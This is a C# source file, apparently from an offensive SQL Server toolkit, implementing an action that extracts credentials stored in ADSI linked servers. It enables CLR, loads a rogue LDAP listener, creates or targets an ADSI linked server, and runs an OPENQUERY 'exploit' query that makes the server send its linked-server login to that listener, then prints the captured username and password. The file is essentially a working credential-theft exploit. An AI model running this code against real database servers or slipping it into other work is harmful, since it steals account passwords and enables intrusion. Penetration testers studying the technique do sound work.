using MSSQLand.Models;
using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Threading.Tasks;

namespace MSSQLand.Actions.Network
{
    /// <summary>
    /// https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiCredentialExtractor : BaseAction
    {
        private enum Mode { List, Self, Link }
        private Mode _mode;
        private string? _targetServer;


        public override void ValidateArguments(string additionalArguments)
        {
            string[] parts = SplitArguments(additionalArguments);

            if (parts.Length == 0)
            {
                throw new ArgumentException("Invalid arguments. Use 'list', 'self', or 'link <SQLServer>'");
            }

            string command = parts[0].ToLower();
            switch (command)
            {
                case "list":
                    _mode = Mode.List;
                    break;

                case "self":
                    _mode = Mode.Self;
                    break;

                case "link":
                    if (parts.Length < 2)
                    {
                        throw new ArgumentException("Missing target SQL Server name. Example: /a:adsi link SQL53");
                    }
                    _mode = Mode.Link;
                    _targetServer = parts[1];
                    break;

                default:
                    throw new ArgumentException("Invalid mode. Use 'list', 'self', or 'link <SQLServer>'");
            }
        }


        /// <summary>
        /// Executes the chosen ADSI extraction method.
        /// </summary>
        public override object? Execute(DatabaseContext databaseContext)
        {
            if (_mode == Mode.List)
            {
                return ListAdsiServers(databaseContext);
            }

            if (_mode == Mode.Self)
            {
                _targetServer = $"SQL-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
                AdsiService adsiService = new(databaseContext);

                if (!adsiService.CreateAdsiLinkedServer(_targetServer))
                {
                    adsiService.DropLinkedServer(_targetServer);
                    if (!adsiService.CreateAdsiLinkedServer(_targetServer))
                    {
                        return null;
                    }
                }

                Tuple<string, string> credentials = ExtractCredentials(databaseContext, _targetServer);

                adsiService.DropLinkedServer(_targetServer);

                return credentials;
            }

            if (_mode == Mode.Link)
            {
                return ExtractCredentials(databaseContext, _targetServer);
            }

            Logger.Error("Unknown execution mode.");
            return null;
        }

        /// <summary>
        /// Lists ADSI linked servers and returns a list of their names.
        /// </summary>
        private List<string>? ListAdsiServers(DatabaseContext databaseContext)
        {

            string query = "SELECT srvname FROM master..sysservers WHERE srvproduct = 'ADSI'";
            DataTable result = databaseContext.QueryService.ExecuteTable(query);

            if (result.Rows.Count == 0)
            {
                Logger.Warning("No ADSI linked servers found.");
                return null;
            }

            // Convert DataTable to a list of server names
            List<string> adsiServers = result.AsEnumerable()
                                             .Select(row => row.Field<string>("srvname"))
                                             .ToList();

            // Join the server names into a comma-separated string for logging
            string serverList = string.Join(", ", adsiServers);

            Logger.Success($"Found {adsiServers.Count} ADSI linked servers");
            Logger.NewLine();

            // Display formatted markdown table
            Console.WriteLine(MarkdownFormatter.ConvertListToMarkdownTable(adsiServers, "ADSI Servers"));

            return adsiServers;
        }


        /// <summary>
        /// Extracts credentials using an ADSI provider.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        /// <param name="adsiServer">The ADSI server to target</param>
        /// <returns>A tuple containing the username and password.</returns>
        private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
        {
            if (!ListAdsiServers(databaseContext).Contains(adsiServer))
            {
                Logger.Error($"ADSI linked server '{adsiServer}' not found.");
                return null;
            }

            Logger.TaskNested($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");


            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                Logger.Error("Failed to enable CLR. Aborting execution.");
                return null;
            }



            AdsiService adsiService = new(databaseContext)
            {
                Port = Misc.GetRandomUnusedPort()
            };

            Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");

            try {
                adsiService.LoadLdapServerAssembly();

                Task<DataTable> task = adsiService.ListenForRequest();

                Logger.TaskNested("Executing LDAP solicitation");

                string impersonateTarget = databaseContext.Server.ImpersonationUser;

                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";

                if (!string.IsNullOrEmpty(impersonateTarget))
                {
                    Logger.Warning("You cannot retrieve impersonated user credential since it is not mapped to your fake ADSI server");
                    exploitQuery = $"REVERT; {exploitQuery}";
                }

                try
                {
                    databaseContext.QueryService.ExecuteNonProcessing(exploitQuery);
                } catch
                {
                    // Ignore the exception, it is normal to fail
                }


                // Wait for the background task to complete and get the result
                DataTable ldapResult = task.Result;

                if (ldapResult != null && ldapResult.Rows.Count > 0)
                {
                    string rawCredentials = ldapResult.Rows[0][0].ToString();
                    Logger.Success("Credentials retrieved");


                    // Split **only at the first occurrence** of `:`
                    int splitIndex = rawCredentials.IndexOf(':');
                    if (splitIndex > 0)
                    {
                        string username = rawCredentials.Substring(0, splitIndex);
                        string password = rawCredentials.Substring(splitIndex + 1);

                        Logger.NewLine();
                        Console.WriteLine($"Username: {username}");
                        Console.WriteLine($"Password: {password}");

                        return Tuple.Create(username.Trim(), password.Trim());
                    }
                }

                Console.WriteLine("No results found");
                return null;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error occurred during the ADSI credentials retrieval exploit: {ex.Message}");
                return null;
            }
        }
    }
}
